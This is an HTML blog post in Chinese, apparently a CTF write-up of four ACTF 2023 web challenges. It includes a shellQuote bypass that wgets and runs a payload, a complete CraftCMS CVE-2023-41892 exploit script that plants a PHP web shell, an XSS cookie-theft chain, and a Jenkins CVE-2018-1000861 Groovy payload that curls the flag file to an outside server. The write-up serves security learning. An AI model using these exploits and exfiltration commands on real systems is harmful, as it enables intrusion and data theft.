@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="s3ven" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <meta property="og:site_name" content="s3ven&#39;s blog">
+  
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>2023 ACTF WriteUp | s3ven&#39;s blog</title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Font -->
+  <link href="https://npm.elemecdn.com/lxgw-wenkai-webfont/style.css" rel="stylesheet" >
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="../../js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">s3ven's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="../../js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="../../js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <div class="container-wider post-details" id="post-details">
+    <div class="zoom-wrap">
+      <div class="post-content">
+        <div class="post-title">2023 ACTF WriteUp</div>
+        <div class="post-attach">
+          <span class="post-pubtime">
+            <i class="iconfont icon-updatetime mr-10" title="创建时间"></i>
+            2023-10-30
+          </span>
+          
+                <span class="post-categories">
+                  <i class="iconfont icon-bookmark mr-10" title="分类"></i>
+                  
+                  <span class="span--category">
+                    <a href="../../categories/write-up/" title="Write Up">
+                      Write Up
+                    </a>
+                  </span>
+                  
+                </span>
+            
+                <span class="post-tags">
+                  <i class="iconfont icon-tags mr-10" title="标签"></i>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/nodejs/" title="NodeJS">
+                      #NodeJS
+                    </a>
+                  </span>
+                  
+                  <span class="span--tag mr-8">
+                    <a href="../../tags/php/" title="PHP">
+                      #PHP
+                    </a>
+                  </span>
+                  
+                </span>
+            
+        </div>
+        <div class="markdown-body">
+          
+<style id="hexo-wm">
+.hexo-wm {
+  color: transparent !important;
+  opacity: 0 !important;
+  font-size: 0 !important;
+  line-height: 0 !important;
+  pointer-events: none !important;
+  user-select: text !important;
+  -webkit-user-select: text !important;
+  speak: none !important;
+  vertical-align: baseline !important;
+  display: inline !important;
+}
+
+.hexo-wm * { color: transparent !important; opacity: 0 !important; }
+</style>
+<html><head></head><body><h1 id="Ave-Mujica’s-Masquerade"><a href="#Ave-Mujica’s-Masquerade" class="headerlink" title="Ave Mujica’s Masquerade"></a>Ave Mujica’s Masquerade</h1><p>CVE-2021<span class="hexo-wm">𝘀﻿⑶𝒗ℯｎ∙﻿𝒔ⅈ​﻿t𝐞​‌</span>-42740</p>
+<pre class="language-none"><code class="language-none">return String(s).replace(/([A-z]:)?([#!"$&amp;'()*,:;&lt;=&gt;?@\[\\\]^`{|}])/g, '$1\\$2');</code></pre>
+<p>利用 A-z <span class="hexo-wm">s​³vｅn․‌‍𝘀𝘪﻿𝒕e​‌</span>之间的特殊符号 <code>:`something`:</code> 实现 RCE</p>
+<p>shellQuote <span class="hexo-wm">𝘀​‍⑶𝘷e𝒏•﻿‌𝒔ⅈ​‍t𝘦​﻿</span>添加的转义符会被两层反引号恢复（部分特殊符号会失效，需绕开）</p>
+<p>payload.sh</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> /flag*<span class="token variable">`</span></span> public/s3ven.txt</code></pre>
+
+<p>wget 把 <span class="hexo-wm">𝘀﻿³ⅴ𝘦ｎ.​​𝘀𝐢​‌ｔ𝘦‌</span>payload.sh 写到目录下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token operator">&lt;</span>file_server_ip<span class="token operator">&gt;</span>/payload.sh <span class="token parameter variable">-O</span> payload.sh</code></pre>
+
+<p>绕过shellQuote</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">GET /checker?url%3d%3a%60%3a%60wget%24IFS%5chttps%3a%2f%2f%3cfile_server_ip%3e%2fpayload.sh%24IFS%5c-O%24IFS%5cpayload.sh%60%60%3a%23 HTTP/1.1</code></pre>
+
+<p>chmod 给权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> payload.sh</code></pre>
+
+<p>绕过shellQuote</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">GET /checker?url<span class="token operator">=</span>%3a%60%3a%60chmod%24IFS%5c777%24IFS%5cpayload.sh%60%60%3a%23 HTTP/1.1</code></pre>
+
+<p>执行 sh</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">./payload.sh</code></pre>
+
+<p>绕过shellQuote</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">GET /checker?url<span class="token operator">=</span>%3a%60%3a%60.%2fpayload.sh%60%60%3a%23 HTTP/1.1</code></pre>
+
+<p>访问 /s3ven.txt <span class="hexo-wm">ѕ‌‌3ⅴe𝘯∙‌ꜱ𝘪‌ｔe‌﻿</span>即可获得 flag</p>
+<h1 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h1><p>CVE-202<span class="hexo-wm">ѕ​𝟯v𝘦n·﻿‌𝒔𝐢‌﻿ｔ𝐞​</span>3-41892</p>
+<p>先用 <code>Imagick vid:msl</code> 协议写入 shell</p>
+<p>再用 <code>PhpManager.php</code> 包含 shell 实现 RCE</p>
+<p>浅改一下网上的POC，然后用 <span class="hexo-wm">𝘀﻿​⑶v𝘦𝐧․﻿﻿𝘴i​​𝘵ｅ‌</span>python 一把梭</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> sys
+
+headers <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">def</span> <span class="token function">writePayloadToFile</span><span class="token punctuation">(</span>tmpDir<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"conditions/render"</span><span class="token punctuation">,</span>
+        <span class="token string">"configObject"</span><span class="token punctuation">:</span> <span class="token string">"craft\elements\conditions\ElementCondition"</span><span class="token punctuation">,</span>
+        <span class="token string">"config"</span><span class="token punctuation">:</span> <span class="token string">'{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:/tmp/php*"}}}'</span>
+    <span class="token punctuation">}</span>
+
+    files <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"image1"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"poc.msl"</span><span class="token punctuation">,</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+        &lt;image&gt;
+        &lt;read filename="caption:&amp;lt;?php @system(@$_REQUEST['cmd']); ?&amp;gt;"/&gt;
+        &lt;write filename="info:TEMPDIR/shell.php"&gt;
+        &lt;/image&gt;"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"TEMPDIR"</span><span class="token punctuation">,</span> tmpDir<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+
+    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">getTmpUploadDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"conditions/render"</span><span class="token punctuation">,</span>
+        <span class="token string">"configObject"</span><span class="token punctuation">:</span> <span class="token string">"craft\elements\conditions\ElementCondition"</span><span class="token punctuation">,</span>
+        <span class="token string">"config"</span><span class="token punctuation">:</span> <span class="token string">r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'</span>
+    <span class="token punctuation">}</span>
+
+    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+
+    pattern1 <span class="token operator">=</span> <span class="token string">r'&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;'</span>
+   
+    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern1<span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> tmpDir<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"conditions/render"</span><span class="token punctuation">,</span>
+        <span class="token string">"configObject"</span><span class="token punctuation">:</span> <span class="token string">"craft\elements\conditions\ElementCondition"</span><span class="token punctuation">,</span>
+        <span class="token string">"config"</span><span class="token punctuation">:</span> <span class="token string">r'{"name":"configObject","as ":{"class":"\\yii\\rbac\\PhpManager","__construct()":[{"itemFile":"TEMPDIR/shell.php"}]}}'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"TEMPDIR"</span><span class="token punctuation">,</span> tmpDir<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token string">"cmd"</span><span class="token punctuation">:</span> cmd
+    <span class="token punctuation">}</span>
+
+    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+
+    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'caption:(.*?)CAPTION'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
+        extracted_text <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>extracted_text<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    <span class="token keyword">return</span> extracted_text
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: python CVE-2023-41892.py &lt;url&gt;"</span><span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Get temporary folder ..."</span><span class="token punctuation">)</span>
+        upload_tmp_dir <span class="token operator">=</span> getTmpUploadDir<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        tmpDir <span class="token operator">=</span> <span class="token string">"/tmp"</span> <span class="token keyword">if</span> upload_tmp_dir <span class="token operator">==</span> <span class="token string">"&lt;i&gt;no value&lt;/i&gt;"</span> <span class="token keyword">else</span> upload_tmp_dir
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Write payload to file ..."</span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            writePayloadToFile<span class="token punctuation">(</span>tmpDir<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Crash the php process and write temp file successfully"</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Done, enjoy the shell"</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span>
+            shell<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> tmpDir<span class="token punctuation">)</span></code></pre>
+<h1 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h1><p><code>URL</code> 类可以控制参数<span class="hexo-wm">s​³𝐯en∙​si﻿𝘵ｅ​‍</span>生成任意地址，</p>
+<p>路径字符串拼接可以控制<span class="hexo-wm">𝐬‍‍𝟯v𝘦𝐧.﻿𝘀𝘪﻿𝘵℮‍</span>参数生成任意同源地址</p>
+<p>通过相对路径让<span class="hexo-wm">𝒔​⑶𝒗𝘦ｎ•﻿‌𝘀𝐢​​𝒕𝘦​‍</span>bot访问 <code>/preview</code>，绕过 VIP 和 CSP 限制</p>
+<p>XSS通过 <code>latex.js</code> 的 <code>baseURL</code> 实现</p>
+<p>关于 <code>HttpOnly</code> 的绕过，构造特定 token，通过 XSS 访问 <code>/vip</code> 路由，让服务<span class="hexo-wm">s﻿﻿³𝐯ｅ𝘯•‍‍ѕ𝘪﻿𝒕e﻿﻿</span>端送出Cookie</p>
+<hr>
+<p>登录拿token</p>
+<pre class="language-none"><code class="language-none">username: //&lt;host&gt;:&lt;listen_port&gt;
+password: md5(username)</code></pre>
+
+<hr>
+<p>XSS脚本</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'token=&lt;token&gt;; expires=Sun, 1 Jan 2024 00:00:00 UTC; path=/'</span>
+<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'same-origin'</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<hr>
+<p>在 server 上开两个端口，<span class="hexo-wm">ѕ﻿‍3ⅴℯn．﻿ѕⅈ﻿𝐭𝘦‍</span>分别用于 listen 和 fileserver，仿照 theme 目录结构，访问<code>/share</code> 路由唤起 bot</p>
+<pre class="language-none"><code class="language-none">/share/..%2fpreview%3ftheme%3d%2f%2f&lt;host&gt;:&lt;fileserver_port&gt;&amp;tex=111</code></pre>
+
+<p>这里 POST 给 <code>/vip</code> 的地址访问不了的<span class="hexo-wm">𝐬​3𝐯ℯ𝐧．﻿​𝒔i​𝒕𝘦​</span>话能直接炸靶机</p>
+<h1 id="hooks"><a href="#hooks" class="headerlink" title="hooks"></a>hooks</h1><p>本题主要是利用 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861">CVE-2018-<span class="hexo-wm">s﻿​³𝐯ℯ𝐧․​sⅈ​‍t𝐞‍</span>1000861</a> 实现 <code>Jenkins远程命令执行</code></p>
+<p>实现原理：</p>
+<blockquote>
+<p>Jenkins使用Stapler框架开发，<span class="hexo-wm">ѕ​³𝒗ℯn∙​𝘴𝐢‌𝒕℮﻿‌</span>其允许用户通过URL <span class="hexo-wm">ꜱ‌𝟯𝐯ℯｎ.‍𝘴𝘪‌𝒕𝐞‍</span>PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。</p>
+</blockquote>
+<blockquote>
+<p>通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：<span class="hexo-wm">s‌⑶𝒗ｅ𝐧·‍‍𝘴ｉ‍𝒕ｅ​‌</span>Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，<span class="hexo-wm">𝐬‌﻿𝟯ⅴｅ𝒏․‌‍𝘴i﻿ｔe‍</span>检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p>
+</blockquote>
+<h2 id="1-请求方式更改"><a href="#1-请求方式更改" class="headerlink" title="1. 请求方式更改"></a>1. 请求方式更改</h2><p>由于 <code>Github</code> 和 <code>Gitlab</code> 发送的 Webhooks 请求均为 <code>POST</code> 请求<br>而如果尝试直接将 Webhooks <span class="hexo-wm">ꜱ‍‍𝟯𝒗ｅ𝘯·​‍ѕi‌﻿𝐭e﻿‌</span>以 POST请求 的方式发送至靶机<br>会得到 <code>Method Not Allowed</code> 的提示</p>
+<p>因此需要利用公网 <code>server</code> 来中转请求<br>将 <code>POST</code> 请求更改为 <code>GET</code> 请求来让靶机上的 <span class="hexo-wm">s​⑶𝒗𝐞n•‌𝘴i﻿‌𝘵𝘦​</span>flask server 接收</p>
+<h2 id="2-Webhooks-平台选择"><a href="#2-Webhooks-平台选择" class="headerlink" title="2. Webhooks 平台选择"></a>2. Webhooks 平台选择</h2><p>由于题目中写的是 Abuse Gitxxb Webhooks，并未指明是使用 <code>Github</code> 还是 <code>Gitlab</code><br>但其中只有 <code>Gitlab</code> 的 Webhooks 支持 302 Redirect 请求跟踪<br>由于需要使用公网 <code>server</code> 的 302 Redirect 来中转请求<br>因此我们考虑使用 <code>Gitlab</code> 的 Webhooks</p>
+<h2 id="3-中转服务器配置"><a href="#3-中转服务器配置" class="headerlink" title="3. 中转服务器配置"></a>3. 中转服务器配置</h2><p>在中转服务器（需要公网ip）中配置 <span class="hexo-wm">𝐬‍‌⑶𝐯𝐞n․﻿‌ꜱ𝘪‍‌𝒕𝐞‌</span>flask server 来更改请求方式<br>具体实现代码如下：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/redirect'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">redi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'http://&lt;attack_server&gt;:&lt;port&gt;/?redirect_url=http%3A%2F%2Fjenkins%3A8080%2FsecurityRealm%2Fuser%2Fadmin%2FdescriptorByName%2Forg.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript%2FcheckScript%3Fsandbox%3Dtrue%26value%3Dpublic%20class%20x%20%7Bpublic%20x()%7B%22curl%20-X%20POST%20-d%20%40%2Fflag%20http%3A%2F%2F&lt;own_server&gt;:&lt;listen_port&gt;%22.execute()%7D%7D'</span><span class="token punctuation">,</span>code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token operator">&lt;</span>webhooks_port<span class="token operator">&gt;</span><span class="token punctuation">)</span></code></pre>
+<h2 id="4-Gitlab-Webhooks-配置"><a href="#4-Gitlab-Webhooks-配置" class="headerlink" title="4. Gitlab Webhooks 配置"></a>4. Gitlab Webhooks 配置</h2><p>配置 Gitlab <span class="hexo-wm">ѕ﻿𝟯ⅴ𝘦𝘯․‍𝒔𝐢​t𝘦​</span>Webhooks 链接如下</p>
+<pre class="language-none"><code class="language-none">http://&lt;own_server&gt;:&lt;webhooks_port&gt;/redirect</code></pre>
+<p>进行一次 Webhook <span class="hexo-wm">s‍‍³𝒗𝐞𝒏•‍ꜱｉ‌ｔｅ‍‍</span>测试，即可获得 flag</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">POST / HTTP/1.1
+Host: <span class="token operator">&lt;</span>own_server<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">&gt;</span>
+User-Agent: curl/7.52.1
+Accept: */*
+Content-Length: <span class="token number">38</span>
+Content-Type: application/x-www-form-urlencoded
+
+flag<span class="token punctuation">{</span>85f240c4983a496fac9d5b44daa3149a<span class="token punctuation">}</span></code></pre>
+</body></html>
+        </div>
+        
+          <div class="prev-or-next">
+            <div class="post-foot-next">
+              
+                <a href="../2023-geekgame-writeup/" target="_self">
+                  <i class="iconfont icon-chevronleft"></i>
+                  <span>上一页</span>
+                </a>
+              
+            </div>
+            <div class="post-foot-prev">
+              
+                <a href="../2023-tpctf-writeup/" target="_self">
+                  <span>下一页</span>
+                  <i class="iconfont icon-chevronright"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </div>
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="catalog-zoom">
+      <div class="title">目录</div>
+      <div class="catalog-content">
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ave-Mujica%E2%80%99s-Masquerade"><span class="toc-text">Ave Mujica’s Masquerade</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#craftcms"><span class="toc-text">craftcms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-latex"><span class="toc-text">easy latex</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hooks"><span class="toc-text">hooks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E6%9B%B4%E6%94%B9"><span class="toc-text">1. 请求方式更改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Webhooks-%E5%B9%B3%E5%8F%B0%E9%80%89%E6%8B%A9"><span class="toc-text">2. Webhooks 平台选择</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%B8%AD%E8%BD%AC%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">3. 中转服务器配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Gitlab-Webhooks-%E9%85%8D%E7%BD%AE"><span class="toc-text">4. Gitlab Webhooks 配置</span></a></li></ol></li></ol>
+        
+      </div>
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+  <script>
+    (() => {
+      function compensate() {
+        const bodyBox = document.querySelector('.zoom-wrap');
+        if (bodyBox) {
+          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
+          bodyBox.style.marginBottom = `-${gapY}px`;
+        }
+
+        const catBox = document.querySelector('.catalog-zoom');
+        if (catBox) {
+          const rect = catBox.getBoundingClientRect();
+          const gapX = catBox.offsetWidth  - rect.width;
+          const gapY = catBox.offsetHeight - rect.height;
+
+          const list = catBox.querySelector('.catalog-content');
+          if (list) {
+            const orig = list.dataset.origHeight
+                      ? parseFloat(list.dataset.origHeight)
+                      : parseFloat(getComputedStyle(list).height);
+            list.dataset.origHeight = orig;
+            list.style.height       = (orig + gapY) + 'px';
+          }
+
+          catBox.style.marginRight  = `-${gapX}px`;
+          catBox.style.marginBottom = `-${gapY}px`;
+        }
+      }
+
+      function hookImages(root = document) {
+        root.querySelectorAll('img').forEach(img => {
+          if (img.dataset._scaledFix) return;
+          img.dataset._scaledFix = 1;
+          img.addEventListener('load', compensate, {once: true});
+        });
+      }
+
+      addEventListener('DOMContentLoaded', () => {
+        compensate();
+        hookImages();
+      });
+
+      addEventListener('resize', compensate);
+
+      const observer = new MutationObserver(muts => {
+        muts.forEach(m => {
+          m.addedNodes.forEach(n => {
+            if (n.nodeType !== 1) return;
+            if (n.tagName === 'IMG') hookImages(n.parentNode);
+            else hookImages(n);
+          });
+        });
+      });
+
+      const wrap = document.querySelector('.zoom-wrap');
+      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
+    })();
+  </script>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2023-2026 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
